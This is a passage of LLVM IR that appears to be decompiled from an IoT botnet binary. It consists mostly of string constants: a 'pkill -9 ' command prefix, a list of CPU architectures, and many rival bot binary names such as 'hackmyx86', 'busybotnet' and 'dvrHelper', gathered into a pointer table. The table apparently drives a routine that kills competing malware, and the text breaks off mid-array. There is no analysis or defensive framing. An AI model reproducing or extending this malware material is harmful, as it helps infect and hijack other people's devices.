source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_6 = type { i32, i32*, i8, i8 }
%anon_struct_15 = type { i32, i32*, i8, i8 }
%anon_struct_15.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_2300c.30 = global i32 0
@global_var_9f5c.35 = constant i32 -509558771
@global_var_19a4c.38 = constant [10 x i8] c"pkill -9 \00"
@global_var_19170.40 = constant [5 x i8] c"mips\00"
@global_var_19178.41 = constant [7 x i8] c"mips64\00"
@global_var_19180.42 = constant [7 x i8] c"mipsel\00"
@global_var_19188.43 = constant [6 x i8] c"sh2eb\00"
@global_var_19190.44 = constant [7 x i8] c"sh2elf\00"
@global_var_19198.45 = constant [4 x i8] c"sh4\00"
@global_var_1919c.46 = constant [4 x i8] c"x86\00"
@global_var_191a0.47 = constant [4 x i8] c"arm\00"
@global_var_191a4.48 = constant [6 x i8] c"armv5\00"
@global_var_191ac.49 = constant [8 x i8] c"armv4tl\00"
@global_var_191b4.50 = constant [6 x i8] c"armv4\00"
@global_var_191bc.51 = constant [6 x i8] c"armv6\00"
@global_var_191c4.52 = constant [5 x i8] c"i686\00"
@global_var_191cc.53 = constant [8 x i8] c"powerpc\00"
@global_var_191d4.54 = constant [13 x i8] c"powerpc440fp\00"
@global_var_191e4.55 = constant [5 x i8] c"i586\00"
@global_var_191ec.56 = constant [5 x i8] c"m68k\00"
@global_var_191f4.57 = constant [6 x i8] c"sparc\00"
@global_var_191fc.58 = constant [7 x i8] c"x86_64\00"
@global_var_19204.59 = constant [11 x i8] c"jackmymips\00"
@global_var_19210.60 = constant [13 x i8] c"jackmymips64\00"
@global_var_19220.61 = constant [13 x i8] c"jackmymipsel\00"
@global_var_19230.62 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_1923c.63 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_1924c.64 = constant [10 x i8] c"jackmysh4\00"
@global_var_19258.65 = constant [10 x i8] c"jackmyx86\00"
@global_var_19264.66 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_19270.67 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_19280.68 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_1928c.69 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_19298.70 = constant [11 x i8] c"jackmyi686\00"
@global_var_192a4.71 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_192b4.72 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_192c8.73 = constant [11 x i8] c"jackmyi586\00"
@global_var_192d4.74 = constant [11 x i8] c"jackmym68k\00"
@global_var_192e0.75 = constant [12 x i8] c"jackmysparc\00"
@global_var_192ec.76 = constant [13 x i8] c"jackmyx86_64\00"
@global_var_192fc.77 = constant [11 x i8] c"hackmymips\00"
@global_var_19308.78 = constant [13 x i8] c"hackmymips64\00"
@global_var_19318.79 = constant [13 x i8] c"hackmymipsel\00"
@global_var_19328.80 = constant [12 x i8] c"hackmysh2eb\00"
@global_var_19334.81 = constant [13 x i8] c"hackmysh2elf\00"
@global_var_19344.82 = constant [10 x i8] c"hackmysh4\00"
@global_var_19350.83 = constant [10 x i8] c"hackmyx86\00"
@global_var_1935c.84 = constant [12 x i8] c"hackmyarmv5\00"
@global_var_19368.85 = constant [14 x i8] c"hackmyarmv4tl\00"
@global_var_19378.86 = constant [12 x i8] c"hackmyarmv4\00"
@global_var_19384.87 = constant [12 x i8] c"hackmyarmv6\00"
@global_var_19390.88 = constant [11 x i8] c"hackmyi686\00"
@global_var_1939c.89 = constant [14 x i8] c"hackmypowerpc\00"
@global_var_193ac.90 = constant [19 x i8] c"hackmypowerpc440fp\00"
@global_var_193c0.91 = constant [11 x i8] c"hackmyi586\00"
@global_var_193cc.92 = constant [11 x i8] c"hackmym68k\00"
@global_var_193d8.93 = constant [12 x i8] c"hackmysparc\00"
@global_var_193e4.94 = constant [13 x i8] c"hackmyx86_64\00"
@global_var_193f4.95 = constant [3 x i8] c"b1\00"
@global_var_193f8.96 = constant [3 x i8] c"b2\00"
@global_var_193fc.97 = constant [3 x i8] c"b3\00"
@global_var_19400.98 = constant [3 x i8] c"b4\00"
@global_var_19404.99 = constant [3 x i8] c"b5\00"
@global_var_19408.100 = constant [3 x i8] c"b6\00"
@global_var_1940c.101 = constant [3 x i8] c"b7\00"
@global_var_19410.102 = constant [3 x i8] c"b8\00"
@global_var_19414.103 = constant [3 x i8] c"b9\00"
@global_var_19418.104 = constant [4 x i8] c"b10\00"
@global_var_1941c.105 = constant [4 x i8] c"b11\00"
@global_var_19420.106 = constant [4 x i8] c"b12\00"
@global_var_19424.107 = constant [4 x i8] c"b13\00"
@global_var_19428.108 = constant [4 x i8] c"b14\00"
@global_var_1942c.109 = constant [4 x i8] c"b15\00"
@global_var_19430.110 = constant [4 x i8] c"b16\00"
@global_var_19434.111 = constant [4 x i8] c"b17\00"
@global_var_19438.112 = constant [4 x i8] c"b18\00"
@global_var_1943c.113 = constant [4 x i8] c"b19\00"
@global_var_19440.114 = constant [4 x i8] c"b20\00"
@global_var_19444.115 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_19458.116 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_19464.117 = constant [10 x i8] c"dvrHelper\00"
@global_var_19470.118 = constant [8 x i8] c"FDFDHFC\00"
@global_var_19478.119 = constant [5 x i8] c"FEUB\00"
@global_var_19480.120 = constant [9 x i8] c"FTUdftui\00"
@global_var_1948c.121 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_19498.122 = constant [6 x i8] c"jhUOH\00"
@global_var_194a0.123 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_194ac.124 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_194b8.125 = constant [8 x i8] c"kmymips\00"
@global_var_194c0.126 = constant [10 x i8] c"kmymips64\00"
@global_var_194cc.127 = constant [10 x i8] c"kmymipsel\00"
@global_var_194d8.128 = constant [9 x i8] c"kmysh2eb\00"
@global_var_194e4.129 = constant [10 x i8] c"kmysh2elf\00"
@global_var_194f0.130 = constant [7 x i8] c"kmysh4\00"
@global_var_194f8.131 = constant [7 x i8] c"kmyx86\00"
@global_var_19500.132 = constant [9 x i8] c"kmyarmv5\00"
@global_var_1950c.133 = constant [11 x i8] c"kmyarmv4tl\00"
@global_var_19518.134 = constant [9 x i8] c"kmyarmv4\00"
@global_var_19524.135 = constant [9 x i8] c"kmyarmv6\00"
@global_var_19530.136 = constant [8 x i8] c"kmyi686\00"
@global_var_19538.137 = constant [11 x i8] c"kmypowerpc\00"
@global_var_19544.138 = constant [16 x i8] c"kmypowerpc440fp\00"
@global_var_19554.139 = constant [8 x i8] c"kmyi586\00"
@global_var_1955c.140 = constant [8 x i8] c"kmym68k\00"
@global_var_19564.141 = constant [9 x i8] c"kmysparc\00"
@global_var_19570.142 = constant [10 x i8] c"kmyx86_64\00"
@global_var_1957c.143 = constant [8 x i8] c"lolmips\00"
@global_var_19584.144 = constant [10 x i8] c"lolmips64\00"
@global_var_19590.145 = constant [10 x i8] c"lolmipsel\00"
@global_var_1959c.146 = constant [9 x i8] c"lolsh2eb\00"
@global_var_195a8.147 = constant [10 x i8] c"lolsh2elf\00"
@global_var_195b4.148 = constant [7 x i8] c"lolsh4\00"
@global_var_195bc.149 = constant [7 x i8] c"lolx86\00"
@global_var_195c4.150 = constant [9 x i8] c"lolarmv5\00"
@global_var_195d0.151 = constant [11 x i8] c"lolarmv4tl\00"
@global_var_195dc.152 = constant [9 x i8] c"lolarmv4\00"
@global_var_195e8.153 = constant [9 x i8] c"lolarmv6\00"
@global_var_195f4.154 = constant [8 x i8] c"loli686\00"
@global_var_195fc.155 = constant [11 x i8] c"lolpowerpc\00"
@global_var_19608.156 = constant [16 x i8] c"lolpowerpc440fp\00"
@global_var_19618.157 = constant [8 x i8] c"loli586\00"
@global_var_19620.158 = constant [8 x i8] c"lolm68k\00"
@global_var_19628.159 = constant [9 x i8] c"lolsparc\00"
@global_var_19634.160 = constant [8 x i8] c"RYrydry\00"
@global_var_1963c.161 = constant [8 x i8] c"telmips\00"
@global_var_19644.162 = constant [10 x i8] c"telmips64\00"
@global_var_19650.163 = constant [10 x i8] c"telmipsel\00"
@global_var_1965c.164 = constant [9 x i8] c"telsh2eb\00"
@global_var_19668.165 = constant [10 x i8] c"telsh2elf\00"
@global_var_19674.166 = constant [7 x i8] c"telsh4\00"
@global_var_1967c.167 = constant [7 x i8] c"telx86\00"
@global_var_19684.168 = constant [9 x i8] c"telarmv5\00"
@global_var_19690.169 = constant [11 x i8] c"telarmv4tl\00"
@global_var_1969c.170 = constant [9 x i8] c"telarmv4\00"
@global_var_196a8.171 = constant [9 x i8] c"telarmv6\00"
@global_var_196b4.172 = constant [8 x i8] c"teli686\00"
@global_var_196bc.173 = constant [11 x i8] c"telpowerpc\00"
@global_var_196c8.174 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_196d8.175 = constant [8 x i8] c"teli586\00"
@global_var_196e0.176 = constant [8 x i8] c"telm68k\00"
@global_var_196e8.177 = constant [9 x i8] c"telsparc\00"
@global_var_196f4.178 = constant [10 x i8] c"telx86_64\00"
@global_var_19700.179 = constant [12 x i8] c"TwoFacemips\00"
@global_var_1970c.180 = constant [14 x i8] c"TwoFacemips64\00"
@global_var_1971c.181 = constant [14 x i8] c"TwoFacemipsel\00"
@global_var_1972c.182 = constant [13 x i8] c"TwoFacesh2eb\00"
@global_var_1973c.183 = constant [14 x i8] c"TwoFacesh2elf\00"
@global_var_1974c.184 = constant [11 x i8] c"TwoFacesh4\00"
@global_var_19758.185 = constant [11 x i8] c"TwoFacex86\00"
@global_var_19764.186 = constant [13 x i8] c"TwoFacearmv5\00"
@global_var_19774.187 = constant [15 x i8] c"TwoFacearmv4tl\00"
@global_var_19784.188 = constant [13 x i8] c"TwoFacearmv4\00"
@global_var_19794.189 = constant [13 x i8] c"TwoFacearmv6\00"
@global_var_197a4.190 = constant [12 x i8] c"TwoFacei686\00"
@global_var_197b0.191 = constant [15 x i8] c"TwoFacepowerpc\00"
@global_var_197c0.192 = constant [20 x i8] c"TwoFacepowerpc440fp\00"
@global_var_197d4.193 = constant [12 x i8] c"TwoFacei586\00"
@global_var_197e0.194 = constant [12 x i8] c"TwoFacem68k\00"
@global_var_197ec.195 = constant [13 x i8] c"TwoFacesparc\00"
@global_var_197fc.196 = constant [14 x i8] c"TwoFacex86_64\00"
@global_var_1980c.197 = constant [9 x i8] c"UYyuyioy\00"
@global_var_19818.198 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_19824.199 = constant [5 x i8] c"xxb1\00"
@global_var_1982c.200 = constant [5 x i8] c"xxb2\00"
@global_var_19834.201 = constant [5 x i8] c"xxb3\00"
@global_var_1983c.202 = constant [5 x i8] c"xxb4\00"
@global_var_19844.203 = constant [5 x i8] c"xxb5\00"
@global_var_1984c.204 = constant [5 x i8] c"xxb6\00"
@global_var_19854.205 = constant [5 x i8] c"xxb7\00"
@global_var_1985c.206 = constant [5 x i8] c"xxb8\00"
@global_var_19864.207 = constant [5 x i8] c"xxb9\00"
@global_var_1986c.208 = constant [6 x i8] c"xxb10\00"
@global_var_19874.209 = constant [6 x i8] c"xxb11\00"
@global_var_1987c.210 = constant [6 x i8] c"xxb12\00"
@global_var_19884.211 = constant [6 x i8] c"xxb13\00"
@global_var_1988c.212 = constant [6 x i8] c"xxb14\00"
@global_var_19894.213 = constant [6 x i8] c"xxb15\00"
@global_var_1989c.214 = constant [6 x i8] c"xxb16\00"
@global_var_198a4.215 = constant [6 x i8] c"xxb17\00"
@global_var_198ac.216 = constant [6 x i8] c"xxb18\00"
@global_var_198b4.217 = constant [6 x i8] c"xxb19\00"
@global_var_198bc.218 = constant [6 x i8] c"xxb20\00"
@global_var_198c4.219 = constant i32 49
@global_var_198c8.220 = constant i32 50
@global_var_198cc.221 = constant i32 51
@global_var_198d0.222 = constant i32 52
@global_var_198d4.223 = constant i32 53
@global_var_198d8.224 = constant i32 54
@global_var_198dc.225 = constant i32 55
@global_var_198e0.226 = constant i32 56
@global_var_198e4.227 = constant i32 57
@global_var_198e8.228 = constant [3 x i8] c"10\00"
@global_var_198ec.229 = constant [3 x i8] c"11\00"
@global_var_198f0.230 = constant [3 x i8] c"12\00"
@global_var_198f4.231 = constant [3 x i8] c"13\00"
@global_var_198f8.232 = constant [3 x i8] c"14\00"
@global_var_198fc.233 = constant [3 x i8] c"15\00"
@global_var_19900.234 = constant [3 x i8] c"16\00"
@global_var_19904.235 = constant [3 x i8] c"17\00"
@global_var_19908.236 = constant [3 x i8] c"18\00"
@global_var_1990c.237 = constant [3 x i8] c"19\00"
@global_var_19910.238 = constant [3 x i8] c"20\00"
@global_var_19914.239 = constant [3 x i8] c"bb\00"
@global_var_19918.240 = constant [11 x i8] c"busybotnet\00"
@global_var_19924.241 = constant [5 x i8] c"pppd\00"
@global_var_1992c.242 = constant [6 x i8] c"pppoe\00"
@global_var_19934.243 = constant [5 x i8] c"wput\00"
@global_var_1993c.244 = constant [3 x i8] c"B1\00"
@global_var_19940.245 = constant [3 x i8] c"B2\00"
@global_var_19944.246 = constant [3 x i8] c"B3\00"
@global_var_19948.247 = constant [3 x i8] c"B4\00"
@global_var_1994c.248 = constant [3 x i8] c"B5\00"
@global_var_19950.249 = constant [3 x i8] c"B6\00"
@global_var_19954.250 = constant [3 x i8] c"B7\00"
@global_var_19958.251 = constant [3 x i8] c"B8\00"
@global_var_1995c.252 = constant [3 x i8] c"B9\00"
@global_var_19960.253 = constant [4 x i8] c"B10\00"
@global_var_19964.254 = constant [4 x i8] c"B11\00"
@global_var_19968.255 = constant [4 x i8] c"B12\00"
@global_var_1996c.256 = constant [4 x i8] c"B13\00"
@global_var_19970.257 = constant [4 x i8] c"B14\00"
@global_var_19974.258 = constant [4 x i8] c"B15\00"
@global_var_19978.259 = constant [4 x i8] c"B16\00"
@global_var_1997c.260 = constant [4 x i8] c"B17\00"
@global_var_19980.261 = constant [4 x i8] c"B18\00"
@global_var_19984.262 = constant [9 x i8] c"B20hackz\00"
@global_var_19990.263 = constant [5 x i8] c"bin*\00"
@global_var_19998.264 = constant [5 x i8] c"gtop\00"
@global_var_199a0.265 = constant [5 x i8] c"ftp*\00"
@global_var_199a8.266 = constant [6 x i8] c"tftp*\00"
@global_var_199b0.267 = constant [7 x i8] c"botnet\00"
@global_var_199b8.268 = constant [8 x i8] c"swatnet\00"
@global_var_199c0.269 = constant [8 x i8] c"ballpit\00"
@global_var_199c8.270 = constant [8 x i8] c"fucknet\00"
@global_var_199d0.271 = constant [9 x i8] c"cracknet\00"
@global_var_199dc.272 = constant [8 x i8] c"weednet\00"
@global_var_199e4.273 = constant [7 x i8] c"gaynet\00"
@global_var_199ec.274 = constant [9 x i8] c"queernet\00"
@global_var_199f8.275 = constant [8 x i8] c"ballnet\00"
@global_var_19a00.276 = constant [5 x i8] c"unet\00"
@global_var_19a08.277 = constant [7 x i8] c"yougay\00"
@global_var_19a10.278 = constant [7 x i8] c"sttftp\00"
@global_var_19a18.279 = constant [7 x i8] c"sstftp\00"
@global_var_19a20.280 = constant [7 x i8] c"sbtftp\00"
@global_var_19a28.281 = constant [6 x i8] c"btftp\00"
@global_var_19a30.282 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_19a3c.283 = constant [6 x i8] c"bruv*\00"
@global_var_19a44.284 = constant [5 x i8] c"IoT*\00"
@global_var_2303c.285 = global [246 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19170.40, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19178.41, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19180.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19188.43, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19190.44, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19198.45, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1919c.46, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_191a0.47, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_191a4.48, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_191ac.49, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_191b4.50, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_191bc.51, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_191c4.52, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_191cc.53, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_191d4.54, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_191e4.55, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_191ec.56, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_191f4.57, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_191fc.58, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_19204.59, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_19210.60, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_19220.61, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19230.62, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1923c.63, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1924c.64, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19258.65, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19264.66, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_19270.67, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19280.68, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1928c.69, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_19298.70, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_192a4.71, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_192b4.72, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_192c8.73, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_192d4.74, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_192e0.75, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_192ec.76, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_192fc.77, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_19308.78, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_19318.79, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19328.80, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_19334.81, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19344.82, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19350.83, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1935c.84, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_19368.85, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19378.86, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19384.87, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_19390.88, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1939c.89, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_193ac.90, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_193c0.91, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_193cc.92, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_193d8.93, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_193e4.94, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_193f4.95, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_193f8.96, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_193fc.97, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19400.98, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19404.99, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19408.100, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1940c.101, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19410.102, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19414.103, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19418.104, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1941c.105, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19420.106, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19424.107, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19428.108, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1942c.109, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19430.110, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19434.111, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19438.112, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1943c.113, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19440.114, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_19444.115, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19458.116, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19464.117, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19470.118, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19478.119, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19480.120, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1948c.121, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19498.122, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_194a0.123, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_194ac.124, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_194b8.125, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_194c0.126, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_194cc.127, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_194d8.128, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_194e4.129, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_194f0.130, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_194f8.131, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19500.132, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1950c.133, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19518.134, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19524.135, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19530.136, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_19538.137, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_19544.138, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19554.139, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1955c.140, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19564.141, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19570.142, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1957c.143, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19584.144, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19590.145, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1959c.146, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_195a8.147, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_195b4.148, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_195bc.149, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_195c4.150, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_195d0.151, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_195dc.152, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_195e8.153, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_195f4.154, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_195fc.155, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_19608.156, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19618.157, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19620.158, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19628.159, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19634.160, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1963c.161, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19644.162, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19650.163, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1965c.164, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19668.165, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19674.166, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1967c.167, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19684.168, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_19690.169, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1969c.170, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_196a8.171, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_196b4.172, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_196bc.173, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_196c8.174, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_196d8.175, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_196e0.176, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_196e8.177, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_196f4.178, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19700.179, i32 0, 